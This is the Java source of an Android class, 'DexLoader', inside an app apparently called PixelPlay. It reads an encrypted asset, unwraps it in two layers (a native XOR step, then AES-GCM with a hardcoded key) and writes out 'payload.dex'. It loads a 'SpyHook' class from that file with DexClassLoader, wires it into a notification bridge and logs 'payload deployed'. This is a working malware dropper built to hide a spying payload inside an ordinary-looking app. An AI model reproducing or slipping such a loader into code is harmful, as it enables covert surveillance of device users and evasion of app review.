package com.pixelplay.app;

import android.content.Context;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import dalvik.system.DexClassLoader;

public class DexLoader {
    private static final String TAG = "PixelPlay";
    private static boolean loaded = false;

    // AES-256 key for payload decryption (same as encrypt.py)
    private static final byte[] AES_KEY = new byte[]{
        (byte)0x8F, (byte)0x3A, (byte)0x5E, (byte)0x1C,
        (byte)0x6F, (byte)0x2B, (byte)0x7D, (byte)0x4A,
        (byte)0xC1, (byte)0x92, (byte)0xAB, (byte)0x34,
        (byte)0x56, (byte)0x78, (byte)0x90, (byte)0xEF,
        (byte)0x12, (byte)0x45, (byte)0x67, (byte)0x89,
        (byte)0xAB, (byte)0xCD, (byte)0xEF, (byte)0x01,
        (byte)0x23, (byte)0x56, (byte)0x78, (byte)0x9A,
        (byte)0xBC, (byte)0xDE, (byte)0xF0, (byte)0xFE
    };
    private static final byte[] AES_IV = new byte[12]; // all zeros (fixed for static payload)

    public static void start(Context context) {
        if (loaded) return;
        try {
            // Read encrypted payload from assets
            InputStream in = context.getAssets().open("data.pak");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) != -1) baos.write(buf, 0, n);
            in.close();
            byte[] fileData = baos.toByteArray();

            if (fileData.length < 256) {
                Log.d(TAG, "payload too small");
                return;
            }

            // Step 1: Native .so XOR unwrap
            if (!Shield.isAvailable()) {
                Log.d(TAG, "shield not available");
                return;
            }
            byte[] aesEncrypted = Shield.unpack(fileData);

            // Step 2: AES-256-GCM decrypt via JCA
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, AES_IV);
            SecretKeySpec keySpec = new SecretKeySpec(AES_KEY, "AES");
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            byte[] decrypted = cipher.doFinal(aesEncrypted);

            // Write decrypted DEX
            File dexDir = context.getDir("dex", Context.MODE_PRIVATE);
            File dexFile = new File(dexDir, "payload.dex");
            FileOutputStream out = new FileOutputStream(dexFile);
            out.write(decrypted);
            out.close();

            // Load via DexClassLoader
            DexClassLoader cl = new DexClassLoader(
                dexFile.getAbsolutePath(),
                dexDir.getAbsolutePath(),
                null,
                context.getClassLoader());
            Class<?> hookClass = cl.loadClass("com.pixelplay.hook.SpyHook");
            Constructor<?> ctor = hookClass.getConstructor();
            Hook hook = (Hook) ctor.newInstance();
            NotificationBridge.setHook(hook);
            loaded = true;
            Log.d(TAG, "[+] payload deployed");
        } catch (Exception e) {
            Log.d(TAG, "dex: " + e.getMessage());
        }
    }
}
